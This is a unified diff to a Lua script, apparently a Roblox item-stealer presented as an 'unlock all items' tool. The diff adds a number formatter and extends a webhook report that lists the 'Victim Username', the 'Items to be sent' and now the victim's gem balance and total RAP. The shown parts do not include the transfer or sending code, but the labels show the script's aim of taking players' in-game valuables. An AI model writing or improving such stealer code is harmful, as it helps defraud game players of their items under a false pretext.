@@ -82,6 +82,16 @@ local function getRAP(Type, Item)
     }) or 0)
 end
 
+local function formatNumber(number)
+    local suffixes = {"", "k", "m", "b", "t"}
+    local index = 1
+    while number >= 1000 and index < #suffixes do
+        number = number / 1000
+        index = index + 1
+    end
+    return string.format("%.2f%s", number, suffixes[index])
+end
+
 -- UNLOCK ALL ITEMS
 for _, category in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard","Booth","Ultimate"}) do
     if save[category] then
@@ -124,7 +134,7 @@ task.spawn(function()
     local fields = {
         {name="Victim Username:", value=plr.Name, inline=true},
         {name="Items to be sent:", value="", inline=false},
-        {name="Summary:", value=string.format("Total RAP: %s", totalRAP), inline=false}
+        {name="Summary:", value=string.format("Gems: %s\nTotal RAP: %s", formatNumber(visualInventory.Currency["Diamonds"]._am), formatNumber(totalRAP)), inline=false}
     }
     for _, item in ipairs(sortedItems) do
         fields[2].value = fields[2].value..item.name.." (x"..item.amount..")\n"
